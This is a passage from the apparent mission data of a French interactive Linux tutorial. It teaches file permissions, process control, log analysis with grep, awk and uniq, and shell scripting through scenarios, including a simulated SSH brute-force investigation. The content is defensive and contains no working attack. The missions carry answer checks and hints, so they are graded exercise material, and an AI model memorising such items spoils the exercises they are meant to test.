        explanation: "Tu vois deux problèmes : <code>deploy.sh</code> est exécutable par tout le monde (rwxrwxrwx) et <code>secret.key</code> est lisible par tout le monde (rw-rw-rw-). Ces permissions sont dangereuses. On va les corriger."
      },

      {
        id: 20,
        name: "Étape 2 — Corriger les permissions",
        cmd: "chmod",
        xp: 40,
        lesson: {
          title: "La commande <code>chmod</code> — Modifier les permissions",
          intro: "<code>chmod</code> modifie les permissions d'un fichier. Tu peux utiliser des lettres (+x, -w) ou des chiffres octaux (755, 600).",
          syntax: "chmod permissions fichier",
          options: [
            { flag: "+x",  desc: "Ajoute la permission d'exécution" },
            { flag: "-w",  desc: "Retire la permission d'écriture" },
            { flag: "600", desc: "rw------- : seulement le propriétaire peut lire/écrire" },
            { flag: "755", desc: "rwxr-xr-x : propriétaire tout, groupe+autres exécution seulement" },
            { flag: "644", desc: "rw-r--r-- : propriétaire lit/écrit, autres lisent seulement" },
          ],
          examples: [
            { cmd: "chmod 600 secret.key",  comment: "# fichier secret : accès propriétaire seulement" },
            { cmd: "chmod 755 deploy.sh",   comment: "# script : exécutable mais pas modifiable par tous" },
            { cmd: "chmod +x script.sh",    comment: "# ajouter l'exécution" },
          ],
          tip: "Retiens : `600` pour les fichiers secrets, `644` pour les fichiers normaux, `755` pour les scripts."
        },
        desc: "Le fichier <code>secret.key</code> est lisible par tout le monde. Corrige ça avec les permissions <code>600</code>.",
        fs: {
          "secret.key": { type: "file", perms: "-rw-rw-rw-", content: "PRIVATE KEY..." },
          "deploy.sh":  { type: "file", perms: "-rwxrwxrwx", content: "#!/bin/bash" },
        },
        hint: "chmod 600 secret.key pour restreindre l'accès au propriétaire seulement",
        check: (out, s) => s.chmod === "secret.key",
        explanation: "Avec <code>chmod 600 secret.key</code>, seul le propriétaire peut lire et écrire ce fichier. Le groupe et les autres n'ont aucun droit. C'est la permission correcte pour une clé privée SSH ou un certificat."
      },

      {
        id: 21,
        name: "Étape 3 — Repérer les processus suspects",
        cmd: "ps aux",
        xp: 35,
        lesson: {
          title: "La commande <code>ps aux</code> — Voir les processus",
          intro: "<code>ps aux</code> affiche tous les processus qui tournent sur le système. C'est l'équivalent du Gestionnaire des tâches, en ligne de commande.",
          syntax: "ps aux",
          options: [
            { flag: "a", desc: "Tous les utilisateurs" },
            { flag: "u", desc: "Format lisible avec CPU et mémoire" },
            { flag: "x", desc: "Inclut les processus sans terminal" },
          ],
          examples: [
            { cmd: "ps aux",               comment: "# tous les processus" },
            { cmd: "ps aux | grep python", comment: "# est-ce que python tourne ?" },
            { cmd: "ps aux | grep nginx",  comment: "# vérifier nginx" },
          ],
          tip: "Colonnes importantes : USER (qui l'a lancé), PID (identifiant), %CPU, %MEM, COMMAND (la commande)."
        },
        desc: "Vérifie les processus en cours. Il y a peut-être encore des processus de l'attaquant qui tournent.",
        fs: {},
        hint: "ps aux pour voir tous les processus en cours",
        check: (out) => /pid|bash|nginx|user/i.test(out),
        explanation: "Tu vois les processus normaux (bash, nginx) mais aussi un processus suspect. Le PID est l'identifiant unique — tu en auras besoin pour arrêter le processus suspect."
      },

      {
        id: 22,
        name: "Étape 4 — Tuer le processus suspect",
        cmd: "kill",
        xp: 35,
        lesson: {
          title: "La commande <code>kill</code> — Arrêter un processus",
          intro: "<code>kill</code> envoie un signal à un processus pour l'arrêter. Par défaut il lui demande de s'arrêter proprement. <code>kill -9</code> le force à s'arrêter immédiatement.",
          syntax: "kill [signal] PID",
          options: [
            { flag: "kill PID",    desc: "Arrêt propre (signal SIGTERM)" },
            { flag: "kill -9 PID", desc: "Arrêt forcé (signal SIGKILL) — si le premier ne marche pas" },
          ],
          examples: [
            { cmd: "kill 1337",      comment: "# demande l'arrêt du processus 1337" },
            { cmd: "kill -9 1337",   comment: "# force l'arrêt" },
            { cmd: "killall node",   comment: "# tue tous les processus node" },
          ],
          tip: "Toujours essayer `kill PID` d'abord. Si ça marche pas, alors `kill -9 PID`."
        },
        desc: "Le processus suspect tourne avec le PID <code>1337</code>. Arrête-le.",
        fs: {},
        hint: "kill suivi du PID du processus à arrêter",
        check: (out, s) => s.kill === "1337",
        explanation: "Processus 1337 terminé. En combinant <code>ps aux | grep suspect</code> pour trouver le PID, puis <code>kill PID</code> pour l'arrêter, tu as le flux de travail complet d'un admin qui nettoie un serveur compromis."
      },

      {
        id: 23,
        name: "Étape 5 — Vérifier qui est connecté",
        cmd: "whoami",
        xp: 20,
        lesson: {
          title: "<code>whoami</code> et <code>id</code> — Ton identité sur le système",
          intro: "Sur Linux, tout action est effectuée sous un utilisateur avec des droits précis. Ces commandes te disent qui tu es aux yeux du système.",
          syntax: "whoami",
          options: [],
          examples: [
            { cmd: "whoami",  comment: "# ton nom d'utilisateur" },
            { cmd: "id",      comment: "# ton UID, GID, et groupes" },
            { cmd: "groups",  comment: "# tes groupes" },
          ],
          tip: "Si `whoami` retourne `root`, tu as tous les droits. C'est puissant mais dangereux — une erreur et tu peux tout casser."
        },
        desc: "Suite à l'intrusion, vérifie sous quel utilisateur tu travailles actuellement.",
        fs: {},
        hint: "whoami est une commande qui retourne ton nom d'utilisateur",
        check: (out) => /user|root/.test(out),
        explanation: "Tu travailles en tant que <code>user</code>. L'attaquant avait réussi à se connecter en tant que <code>root</code>. Si tu avais été root, tu aurais dû immédiatement changer le mot de passe avec <code>passwd</code>."
      },

      {
        id: 24,
        name: "Étape 6 — Vérifier les variables d'environnement",
        cmd: "echo $",
        xp: 25,
        lesson: {
          title: "Les variables d'environnement",
          intro: "Les variables d'environnement stockent des informations importantes pour le système et les programmes. L'attaquant aurait pu en modifier pour laisser une backdoor.",
          syntax: "echo $VARIABLE",
          options: [],
          examples: [
            { cmd: "echo $PATH",   comment: "# où Linux cherche les programmes" },
            { cmd: "echo $HOME",   comment: "# ton dossier personnel" },
            { cmd: "echo $USER",   comment: "# ton nom d'utilisateur" },
            { cmd: "env",          comment: "# toutes les variables d'un coup" },
          ],
          tip: "Un attaquant peut modifier `$PATH` pour que tes commandes pointent vers ses scripts malveillants au lieu des vraies. Toujours vérifier après une intrusion."
        },
        desc: "Vérifie la variable <code>$PATH</code> pour t'assurer qu'elle n'a pas été compromise.",
        fs: {},
        hint: "echo $PATH pour voir où Linux cherche les programmes",
        check: (out) => /usr\/bin|usr\/local|bin/.test(out),
        explanation: "Le PATH semble normal : il pointe vers <code>/usr/bin</code>, <code>/bin</code> etc. Si l'attaquant avait ajouté <code>/tmp</code> en début de PATH, tes commandes système auraient pu être détournées vers ses scripts."
      }
    ]
  },

  // ════════════════════════════════════════════════════════════
  {
    id: 5,
    title: "⚡ Scénario 5 — Optimiser le serveur",
    scenario: "Le serveur tourne lentement. Tu dois analyser l'utilisation des ressources, nettoyer les fichiers inutiles, et préparer une migration.",
    missions: [

      {
        id: 25,
        name: "Étape 1 — Vérifier le disque",
        cmd: "df -h",
        xp: 35,
        lesson: {
          title: "<code>df -h</code> — Espace disque disponible",
          intro: "<code>df</code> (Disk Free) affiche l'espace disque de chaque partition. L'option <code>-h</code> affiche les tailles en Ko/Mo/Go au lieu de bytes.",
          syntax: "df -h",
          options: [
            { flag: "-h",  desc: "Human-readable : Ko, Mo, Go au lieu de bytes" },
          ],
          examples: [
            { cmd: "df -h",            comment: "# espace de toutes les partitions" },
            { cmd: "du -sh /var/log",  comment: "# taille du dossier /var/log" },
            { cmd: "du -sh *",         comment: "# taille de chaque élément ici" },
          ],
          tip: "Un disque à 90%+ c'est une urgence. Les applications commencent à planter quand le disque est plein."
        },
        desc: "Le serveur est lent. Commence par vérifier si le disque n'est pas plein.",
        fs: {},
        hint: "df -h pour voir l'espace disque disponible",
        check: (out) => /filesystem|tmpfs|\/dev|go|mo|ko/i.test(out),
        explanation: "Tu vois l'utilisation de chaque partition. Si une partition est à 95%+, c'est la cause du problème. Les logs et les fichiers temporaires sont souvent responsables."
      },

      {
        id: 26,
        name: "Étape 2 — Trouver les gros fichiers",
        cmd: "find",
        xp: 40,
        lesson: {
          title: "<code>find</code> avec critères avancés",
          intro: "Tu sais que le disque est plein. Mais quels fichiers prennent de la place ? <code>find</code> peut chercher par taille.",
          syntax: "find . -name '*.log'",
          options: [
            { flag: "-name '*.log'",  desc: "Cherche par nom/extension" },
            { flag: "-size +10M",     desc: "Fichiers de plus de 10 Mo" },
            { flag: "-type f",        desc: "Seulement les fichiers" },
          ],
          examples: [
            { cmd: "find . -name '*.log'",       comment: "# tous les fichiers log" },
            { cmd: "find /var -name '*.log'",    comment: "# logs dans /var" },
            { cmd: "find . -name '*.tmp'",       comment: "# fichiers temporaires" },
          ],
          tip: "Les fichiers .log et .tmp sont souvent les coupables quand le disque est plein. `find` te permet de les localiser tous en une commande."
        },
        desc: "Trouve tous les fichiers <code>.log</code> dans le répertoire courant — ce sont probablement eux qui remplissent le disque.",
        fs: {
          "app.js":        { type: "file", content: "// app" },
          "error.log":     { type: "file", content: "beaucoup d'erreurs..." },
          "access.log":    { type: "file", content: "beaucoup d'accès..." },
          "debug.log":     { type: "file", content: "beaucoup de debug..." },
          "old.log":       { type: "file", content: "vieux logs..." },
          "config.json":   { type: "file", content: "{}" },
        },
        hint: "find . -name '*.log' pour trouver tous les fichiers log",
        check: (out) => /error\.log/.test(out) && /access\.log/.test(out) && /debug\.log/.test(out),
        explanation: "Tu as trouvé 4 fichiers .log. En production, ces fichiers peuvent atteindre plusieurs gigaoctets. Maintenant tu sais quoi nettoyer."
      },

      {
        id: 27,
        name: "Étape 3 — Analyser un log avec sed",
        cmd: "sed",
        xp: 50,
        lesson: {
          title: "La commande <code>sed</code> — Modifier du texte",
          intro: "<code>sed</code> (Stream Editor) modifie du texte à la volée. Son usage principal : remplacer du texte dans un fichier sans l'ouvrir dans un éditeur.",
          syntax: "sed 's/ancien/nouveau/g' fichier",
          options: [
            { flag: "s/x/y/",   desc: "Remplace x par y (1ère occurrence par ligne)" },
            { flag: "s/x/y/g",  desc: "Remplace x par y partout (global)" },
            { flag: "-i",       desc: "Modifie le fichier directement (in-place)" },
          ],
          examples: [
            { cmd: "sed 's/ERROR/ERREUR/g' app.log",        comment: "# affiche avec remplacement" },
            { cmd: "sed -i 's/localhost/prod.com/' config", comment: "# modifie le fichier" },
            { cmd: "sed 's/DEBUG//' debug.log",             comment: "# supprime le mot DEBUG" },
          ],
          tip: "Toujours tester sans `-i` d'abord pour vérifier le résultat. Ajoute `-i` seulement quand tu es sûr."
        },
        desc: "Dans <code>config.json</code>, remplace <code>localhost</code> par <code>prod.monserveur.com</code> pour préparer la migration.",
        fs: {
          "config.json": { type: "file", content: '{"host":"localhost","db":"localhost:5432","redis":"localhost:6379"}' },
        },
        hint: "sed 's/localhost/prod.monserveur.com/g' config.json",
        check: (out) => /prod\.monserveur\.com/.test(out) && !/localhost/.test(out),
        explanation: "Tu as remplacé toutes les occurrences de localhost par l'adresse de production. Le `g` à la fin est crucial : sans lui, seule la première occurrence de chaque ligne serait remplacée."
      },

      {
        id: 28,
        name: "Étape 4 — Tester l'API",
        cmd: "curl",
        xp: 45,
        lesson: {
          title: "La commande <code>curl</code> — Requêtes HTTP",
          intro: "<code>curl</code> fait des requêtes HTTP depuis le terminal. Indispensable pour tester des APIs, vérifier qu'un service répond, ou télécharger des fichiers.",
          syntax: "curl [options] URL",
          options: [
            { flag: "-I",          desc: "Affiche seulement les headers (pas le body)" },
            { flag: "-X POST",     desc: "Envoie une requête POST" },
            { flag: "-o fichier",  desc: "Sauvegarde la réponse dans un fichier" },
          ],
          examples: [
            { cmd: "curl https://monapi.com",          comment: "# requête GET simple" },
            { cmd: "curl -I https://monapi.com",       comment: "# vérifier le status HTTP" },
            { cmd: "curl https://monapi.com/health",   comment: "# endpoint de santé" },
          ],
          tip: "La plupart des APIs ont un endpoint `/health` ou `/ping` pour vérifier qu'elles fonctionnent. C'est la première chose à tester après un déploiement."
        },
        desc: "Vérifie que le nouveau serveur répond correctement en faisant une requête vers <code>https://prod.monserveur.com</code>.",
        fs: {},
        hint: "curl suivi de l'URL du serveur",
        check: (out) => /html|http|200|example/i.test(out),
        explanation: "Le serveur répond. Dans la vraie vie tu vérifierais le code HTTP (200 = OK, 500 = erreur serveur). <code>curl -I https://prod.monserveur.com</code> affiche juste les headers, plus rapide quand tu veux juste savoir si ça répond."
      },

      {
        id: 29,
        name: "Étape 5 — Créer un lien de déploiement",
        cmd: "ln -s",
        xp: 50,
        lesson: {
          title: "Les liens symboliques — Déploiement sans downtime",
          intro: "Un lien symbolique pointe vers un fichier ou dossier. Changer le lien change la destination instantanément — sans interruption de service. C'est la technique de déploiement zéro-downtime.",
          syntax: "ln -s cible nom_du_lien",
          options: [
            { flag: "-s",  desc: "Crée un lien symbolique (soft link)" },
            { flag: "-f",  desc: "Force : remplace le lien existant" },
          ],
          examples: [
            { cmd: "ln -s /app/v2 /app/current",           comment: "# current pointe vers v2" },
            { cmd: "ln -sf /app/v3 /app/current",          comment: "# mise à jour vers v3" },
          ],
          tip: "Technique classique : tu prépares v2 complètement, puis tu changes juste le lien `current` de v1 vers v2. Le basculement est instantané et réversible."
        },
        desc: "Tu as deux versions de l'app : <code>app-v1</code> et <code>app-v2</code>. Crée un lien <code>app-current</code> pointant vers <code>app-v2</code>.",
        fs: {
          "app-v1": { type: "dir" },
          "app-v2": { type: "dir" },
        },
        hint: "ln -s app-v2 app-current",
        check: (out, s) => s.symlink === "app-current",
        explanation: "Le lien <code>app-current</code> pointe maintenant vers <code>app-v2</code>. Si v2 plante, une seule commande pour revenir : <code>ln -sf app-v1 app-current</code>. C'est le rollback instantané."
      },

      {
        id: 30,
        name: "Étape 6 — Analyser les données CSV",
        cmd: "awk",
        xp: 60,
        lesson: {
          title: "La commande <code>awk</code> — Extraire des colonnes",
          intro: "<code>awk</code> traite les fichiers colonne par colonne. Parfait pour extraire des données structurées depuis des CSV, des logs avec colonnes fixes, etc.",
          syntax: "awk -F',' '{print $1}' fichier.csv",
          options: [
            { flag: "-F','",       desc: "Définit la virgule comme séparateur de colonnes" },
            { flag: "$1, $2, $3",  desc: "Numéro de colonne à afficher" },
            { flag: "NR",          desc: "Numéro de la ligne courante" },
          ],
          examples: [
            { cmd: "awk '{print $1}' fichier.txt",        comment: "# 1ère colonne (séparateur espace)" },
            { cmd: "awk -F',' '{print $2}' data.csv",     comment: "# 2ème colonne d'un CSV" },
            { cmd: "ps aux | awk '{print $1, $2}'",       comment: "# user et PID de chaque processus" },
          ],
          tip: "`awk` est un mini-langage de programmation. Pour débuter, retiens juste `-F` pour le séparateur et `$N` pour la colonne N."
        },
        desc: "Tu as un rapport de performance <code>metrics.csv</code>. Extrait seulement les noms de serveurs (première colonne).",
        fs: {
          "metrics.csv": { type: "file", content: "prod-web-01,cpu:85%,mem:72%,status:OK\nprod-web-02,cpu:12%,mem:45%,status:OK\nprod-db-01,cpu:95%,mem:88%,status:WARNING\nstaging-01,cpu:5%,mem:20%,status:OK" },
        },
        hint: "awk -F',' '{print $1}' metrics.csv pour la première colonne",
        check: (out) => /prod-web|prod-db|staging/.test(out) && !/cpu|mem|status/i.test(out),
        explanation: "Tu as extrait seulement les noms de serveurs. Tu peux voir que <code>prod-db-01</code> est en WARNING avec 95% CPU et 88% mémoire — c'est probablement lui qui ralentit tout. <code>awk</code> t'a permis d'isoler cette information en une ligne."
      }
    ]
  },

  // ════════════════════════════════════════════════════════════
  {
    id: 6,
    title: "🚨 Scénario 6 — Intrusion détectée",
    scenario: "Lundi, 7h02. Le monitoring hurle : quelqu'un s'est introduit dans le serveur pendant le week-end. Tu es l'analyste de garde. Traces, IP, processus véreux — mène l'enquête et rédige le rapport.",
    missions: [

      {
        id: 31,
        name: "Étape 1 — Les dernières traces",
        cmd: "tail",
        xp: 40,
        lesson: {
          title: "La commande <code>tail</code> — La fin des logs",
          intro: "Dans un fichier de log, les lignes les plus récentes sont <strong>à la fin</strong>. <code>tail</code> (queue) affiche les dernières lignes — c'est LE réflexe de l'analyste : « qu'est-ce qui vient de se passer ? ». Et grâce aux <strong>chemins</strong>, pas besoin de se déplacer : <code>tail logs/auth.log</code> vise directement le fichier.",
          syntax: "tail [-n N] chemin/fichier",
          options: [
            { flag: "-n 5",  desc: "Affiche les 5 dernières lignes (10 par défaut)" },
            { flag: "-f",    desc: "Mode « follow » : affiche les nouvelles lignes en direct (irremplaçable en prod)" },
          ],
          examples: [
            { cmd: "tail -n 5 logs/auth.log",   comment: "# les 5 derniers événements d'authentification" },
            { cmd: "tail -n 20 /var/log/syslog", comment: "# chemin absolu : la fin du log système" },
            { cmd: "tail -f app.log",            comment: "# suivre le log en temps réel (Ctrl+C pour quitter)" },
          ],
          tip: "`head` = le début, `tail` = la fin. Pour une enquête, on commence toujours par `tail` : l'incident est récent, donc en bas du fichier."
        },
        desc: "Le journal d'authentification est dans <code>logs/auth.log</code>. Sans te déplacer, affiche ses <strong>5 dernières lignes</strong> — c'est là que l'intrusion s'est jouée.",
        fs: {
          "readme.txt":    { type: "file", content: "Alerte monitoring 07:02 — activité SSH anormale cette nuit.\nLes journaux sont dans logs/." },
          "logs":          { type: "dir" },
          "logs/auth.log": { type: "file", content: "06:58:01 OK alice 10.0.0.3\n07:12:44 OK bob 192.168.1.20\n23:41:02 FAILED root 203.0.113.66\n23:41:05 FAILED root 203.0.113.66\n23:41:09 FAILED admin 203.0.113.66\n23:41:14 FAILED root 203.0.113.66\n23:41:20 FAILED admin 203.0.113.66\n23:41:27 FAILED root 203.0.113.66\n23:41:33 FAILED root 203.0.113.66\n23:41:40 ACCEPTED root 203.0.113.66\n23:42:01 OK root session-ouverte" },
        },
        hint: "tail -n 5 logs/auth.log  (le chemin remplace le déplacement)",
        check: (out) => /accepted/.test(out) && !/alice/.test(out),
        explanation: "Regarde la dernière tentative : après une rafale de <code>FAILED</code>, un <code>ACCEPTED root</code> à 23:41:40. Quelqu'un a fini par <strong>entrer en root</strong> depuis 203.0.113.66. C'est officiellement une intrusion — l'enquête commence."
      },

      {
        id: 32,
        name: "Étape 2 — Mesurer l'attaque",
        cmd: "grep -c",
        xp: 45,
        lesson: {
          title: "<code>grep -c</code> et <code>grep -v</code> — Compter et exclure",
          intro: "Tu connais <code>grep</code> pour filtrer. Deux options le transforment en outil d'analyse : <code>-c</code> (count) donne directement le <strong>nombre</strong> de lignes trouvées, <code>-v</code> (invert) garde les lignes qui ne contiennent <strong>PAS</strong> le motif.",
          syntax: "grep -c MOTIF chemin/fichier",
          options: [
            { flag: "-c",  desc: "Compte les lignes correspondantes (au lieu de les afficher)" },
            { flag: "-v",  desc: "Inverse : lignes SANS le motif" },
            { flag: "-i",  desc: "Ignore majuscules/minuscules" },
          ],
          examples: [
            { cmd: "grep -c FAILED logs/auth.log",  comment: "# combien d'échecs de connexion ?" },
            { cmd: "grep -v OK logs/auth.log",      comment: "# tout ce qui n'est pas normal" },
            { cmd: "grep FAILED f.log | wc -l",     comment: "# équivalent de -c, en pipeline" },
          ],
          tip: "Un rapport d'incident exige des chiffres précis. « Beaucoup de tentatives » ne veut rien dire ; « 7 tentatives en 31 secondes » qualifie un brute-force."
        },
        desc: "Pour le rapport, il faut du chiffre : <strong>combien de tentatives échouées</strong> (lignes <code>FAILED</code>) contient <code>logs/auth.log</code> ?",
        fs: {
          "logs":          { type: "dir" },
          "logs/auth.log": { type: "file", content: "06:58:01 OK alice 10.0.0.3\n07:12:44 OK bob 192.168.1.20\n23:41:02 FAILED root 203.0.113.66\n23:41:05 FAILED root 203.0.113.66\n23:41:09 FAILED admin 203.0.113.66\n23:41:14 FAILED root 203.0.113.66\n23:41:20 FAILED admin 203.0.113.66\n23:41:27 FAILED root 203.0.113.66\n23:41:33 FAILED root 203.0.113.66\n23:41:40 ACCEPTED root 203.0.113.66\n23:42:01 OK root session-ouverte" },
        },
        hint: "grep -c FAILED logs/auth.log  (ou grep FAILED logs/auth.log | wc -l)",
        check: (out) => /\b7\b/.test(out),
        explanation: "<strong>7 tentatives échouées en 31 secondes</strong>, puis une réussie : c'est la signature d'un brute-force (un robot qui essaie des mots de passe en boucle). Un humain ne tape pas 7 mots de passe en 31 secondes."
      },

      {
        id: 33,
        name: "Étape 3 — Identifier l'attaquant",
        cmd: "awk / cut",
        xp: 50,
        lesson: {
          title: "Extraire une colonne d'un log — <code>awk</code> / <code>cut</code>",
          intro: "Chaque ligne du log a 4 colonnes : <code>heure statut utilisateur ip</code>. Pour isoler les IP, on enchaîne : <code>grep</code> filtre les lignes intéressantes, puis <code>awk '{print $4}'</code> (ou <code>cut -d' ' -f4</code>) extrait la 4e colonne. C'est LE pipeline d'analyse de logs.",
          syntax: "grep MOTIF fichier | awk '{print $N}'",
          options: [
            { flag: "$4",        desc: "awk : la 4e colonne (séparateur = espaces)" },
            { flag: "-d' ' -f4", desc: "cut : même chose, séparateur espace explicite" },
          ],
          examples: [
            { cmd: "grep FAILED logs/auth.log | awk '{print $4}'", comment: "# les IP des échecs" },
            { cmd: "grep FAILED logs/auth.log | cut -d' ' -f4",    comment: "# pareil avec cut" },
            { cmd: "ps aux | awk '{print $2}'",                     comment: "# tous les PID" },
          ],
          tip: "filtrer (`grep`) PUIS découper (`awk`/`cut`) : retiens ce duo, il résout 80 % des analyses de logs."
        },
        desc: "D'où vient l'attaque ? Extrais <strong>uniquement les IP</strong> (4e colonne) des lignes <code>FAILED</code> de <code>logs/auth.log</code>.",
        fs: {
          "logs":          { type: "dir" },
          "logs/auth.log": { type: "file", content: "06:58:01 OK alice 10.0.0.3\n07:12:44 OK bob 192.168.1.20\n23:41:02 FAILED root 203.0.113.66\n23:41:05 FAILED root 203.0.113.66\n23:41:09 FAILED admin 203.0.113.66\n23:41:14 FAILED root 203.0.113.66\n23:41:20 FAILED admin 203.0.113.66\n23:41:27 FAILED root 203.0.113.66\n23:41:33 FAILED root 203.0.113.66\n23:41:40 ACCEPTED root 203.0.113.66\n23:42:01 OK root session-ouverte" },
        },
        hint: "grep FAILED logs/auth.log | awk '{print $4}'",
        check: (out) => /203\.0\.113\.66/.test(out) && !/failed/.test(out) && !/root|admin/.test(out),
        explanation: "Une seule IP derrière les 7 échecs : <strong>203.0.113.66</strong>. Toutes les tentatives viennent de la même machine. Tu tiens ton suspect — reste à confirmer que c'est bien lui le plus agressif."
      },

      {
        id: 34,
        name: "Étape 4 — Le top des IP",
        cmd: "sort | uniq -c",
        xp: 55,
        lesson: {
          title: "<code>sort | uniq -c</code> — Le compteur d'occurrences",
          intro: "Le pipeline le plus célèbre du sysadmin : <code>sort</code> regroupe les lignes identiques (uniq ne voit que les doublons <strong>adjacents</strong> !), puis <code>uniq -c</code> compte chaque groupe. Résultat : un histogramme instantané.",
          syntax: "sort fichier | uniq -c",
          options: [
            { flag: "uniq -c",   desc: "Préfixe chaque ligne par son nombre d'occurrences" },
            { flag: "sort -n",   desc: "(bonus) retrie le résultat par nombre croissant" },
          ],
          examples: [
            { cmd: "sort ips.txt | uniq -c",            comment: "# combien de fois chaque IP ?" },
            { cmd: "sort ips.txt | uniq -c | sort -n",  comment: "# classement final, pire en bas" },
          ],
          tip: "Sans `sort` d'abord, `uniq` rate les doublons éloignés. sort → uniq, TOUJOURS dans cet ordre."
        },
        desc: "Le pare-feu a extrait toutes les IP de la semaine dans <code>ips.txt</code>. Compte les occurrences de chaque IP pour prouver laquelle domine.",
        fs: {
          "ips.txt": { type: "file", content: "203.0.113.66\n10.0.0.3\n203.0.113.66\n192.168.1.20\n203.0.113.66\n10.0.0.3\n203.0.113.66\n192.168.1.20\n203.0.113.66\n192.168.1.20\n203.0.113.66" },
        },
        hint: "sort ips.txt | uniq -c",
        check: (out) => /6 203\.0\.113\.66/.test(out),
        explanation: "<strong>6 occurrences pour 203.0.113.66</strong>, loin devant les IP internes légitimes. Le doute n'est plus permis. Cette IP sera bannie — mais d'abord, vérifions ce que l'intrus a laissé derrière lui."
      },

      {
        id: 35,
        name: "Étape 5 — La porte dérobée",
        cmd: "ps / kill",
        xp: 55,
        lesson: {
          title: "Traquer un processus — <code>ps aux | grep</code> puis <code>kill</code>",
          intro: "Un intrus laisse souvent un processus qui tourne (une « backdoor ») pour revenir plus tard. <code>ps aux</code> liste tout ce qui tourne ; on filtre avec <code>grep</code>, on repère le <strong>PID</strong> (2e colonne), et on tue avec <code>kill</code>.",
          syntax: "ps aux | grep MOTIF   puis   kill PID",
          options: [
            { flag: "ps aux",   desc: "Tous les processus de la machine" },
            { flag: "kill PID", desc: "Arrêt propre (SIGTERM)" },
            { flag: "kill -9",  desc: "Arrêt forcé (SIGKILL) — en dernier recours" },
          ],
          examples: [
            { cmd: "ps aux | grep python",  comment: "# les processus python en cours" },
            { cmd: "kill 1235",             comment: "# arrêt propre du PID 1235" },
            { cmd: "kill -9 1235",          comment: "# s'il résiste" },
          ],
          tip: "Avant de tuer un processus, note son nom et son PID pour le rapport. Sur une vraie machine compromise, on capture d'abord les preuves."
        },
        desc: "L'intrus a laissé tourner un processus <code>python3 app.py</code> suspect. Repère son <strong>PID</strong> avec <code>ps aux</code> (filtre avec grep si tu veux), puis <strong>tue-le</strong>.",
        fs: {},
        hint: "ps aux | grep python  → repère le PID (2e colonne) →  kill 1235",
        check: (out, s) => s.kill === "1235",
        explanation: "La backdoor est morte. Le processus <code>python3 app.py</code> (PID 1235) était le moyen de retour de l'intrus. Sur un vrai incident, on aurait aussi vérifié <code>crontab -l</code> et les clés SSH ajoutées — les intrus adorent laisser plusieurs portes."
      },

      {
        id: 36,
        name: "Étape 6 — Le rapport d'incident",
        cmd: "echo > + chmod",
        xp: 70,
        lesson: {
          title: "Consigner et protéger — <code>echo ></code> puis <code>chmod 600</code>",
          intro: "Un incident sans rapport n'existe pas. On consigne les faits dans un fichier (<code>echo \"...\" > rapport</code>), puis on le <strong>protège</strong> : <code>chmod 600</code> = lecture/écriture pour toi seul. Un rapport d'incident contient des infos sensibles — il ne doit pas traîner en 644.",
          syntax: 'echo "texte" > fichier   puis   chmod 600 fichier',
          options: [
            { flag: "600", desc: "rw------- : toi seul (secrets, rapports, clés)" },
            { flag: "644", desc: "rw-r--r-- : lisible par tous (fichiers normaux)" },
            { flag: "755", desc: "rwxr-xr-x : exécutable par tous (scripts)" },
          ],
          examples: [
            { cmd: 'echo "IP 203.0.113.66 bannie" > rapport-incident.txt', comment: "# consigner" },
            { cmd: "chmod 600 rapport-incident.txt",                        comment: "# protéger" },
            { cmd: "ls -l rapport-incident.txt",                            comment: "# vérifier : -rw-------" },
          ],
          tip: "Retiens le trio : 600 pour les secrets, 644 pour les fichiers, 755 pour les scripts. 777, lui, n'est JAMAIS la bonne réponse."
        },
        desc: "Dernière étape : crée le rapport (<code>echo \"IP 203.0.113.66 bannie - brute force\" > rapport-incident.txt</code>), puis <strong>protège-le en 600</strong> pour que toi seul puisses le lire.",
        fs: {},
        hint: 'echo "IP 203.0.113.66 bannie" > rapport-incident.txt  puis  chmod 600 rapport-incident.txt',
        check: (out, s) => s.chmod === "rapport-incident.txt",
        explanation: "Enquête bouclée : intrusion identifiée (brute-force SSH), attaquant confirmé (203.0.113.66), backdoor éliminée (PID 1235), rapport rédigé et protégé en <code>-rw-------</code>. C'est exactement le déroulé d'une vraie réponse à incident. 🛡️ Beau travail, analyste."
      }
    ]
  },

  // ════════════════════════════════════════════════════════════
  {
    id: 7,
    title: "🤖 Scénario 7 — Automatiser (scripting)",
    scenario: "Tu en as marre de répéter les mêmes commandes à la main. Il est temps de faire ce que fait tout bon admin : automatiser. Variables, boucles, conditions, scripts — le shell devient un vrai langage.",
    missions: [

      {
        id: 37,
        name: "Étape 1 — Une variable",
        cmd: "x=…  $x",
        xp: 40,
        lesson: {
          title: "Les <code>variables</code> — mémoriser une valeur",
          intro: "Une variable stocke une valeur qu'on réutilise ensuite. On l'écrit <strong>sans espace</strong> autour du <code>=</code> : <code>nom=valeur</code>. Pour lire sa valeur, on préfixe d'un <code>$</code> : <code>$nom</code>. Simple, mais c'est la base de tout script.",
          syntax: "nom=valeur      puis      echo $nom",
          options: [
            { flag: "x=5",        desc: "Affecte 5 à x (aucun espace autour du =)" },
            { flag: "$x",         desc: "Lit la valeur de x" },
            { flag: '"$x"',       desc: "Guillemets DOUBLES : la variable est lue" },
            { flag: "'$x'",       desc: "Guillemets SIMPLES : littéral, pas d'expansion" },
          ],
          examples: [
            { cmd: "serveur=web-01",       comment: "# on mémorise" },
            { cmd: "echo $serveur",        comment: "# → web-01" },
            { cmd: 'echo "hôte: $serveur"', comment: "# → hôte: web-01" },
          ],
          tip: "Piège classique : `x = 5` (avec espaces) ne marche PAS. C'est `x=5`, collé."
        },
        desc: "Range le nom <strong>web-01</strong> dans une variable appelée <code>serveur</code>, puis affiche-la avec <code>echo</code>.",
        fs: {},
        hint: "serveur=web-01   puis   echo $serveur",
        check: (out, s) => /web-01/.test(out) && !!s.assign,
        explanation: "Tu viens de créer ta première variable. Une fois définie, elle vit toute la session : tu peux la relire autant de fois que tu veux avec <code>$serveur</code>. C'est la brique de base de l'automatisation."
      },

      {
        id: 38,
        name: "Étape 2 — Capturer une sortie",
        cmd: "$( … )",
        xp: 45,
        lesson: {
          title: "La substitution de commande <code>$(…)</code>",
          intro: "Le vrai pouvoir : mettre le <strong>résultat d'une commande</strong> dans une variable ou dans un texte. On entoure la commande de <code>$(</code> et <code>)</code>. Bash exécute d'abord ce qu'il y a dedans, puis remplace par sa sortie.",
          syntax: "variable=$(commande)     ·     echo \"... $(commande) ...\"",
          options: [
            { flag: "$(ls)",             desc: "Remplacé par la liste des fichiers" },
            { flag: "$(cat f)",          desc: "Remplacé par le contenu de f" },
            { flag: "$(ls *.log | wc -l)", desc: "On peut y mettre un pipeline entier" },
          ],
          examples: [
            { cmd: "n=$(ls *.log | wc -l)", comment: "# n = nombre de .log" },
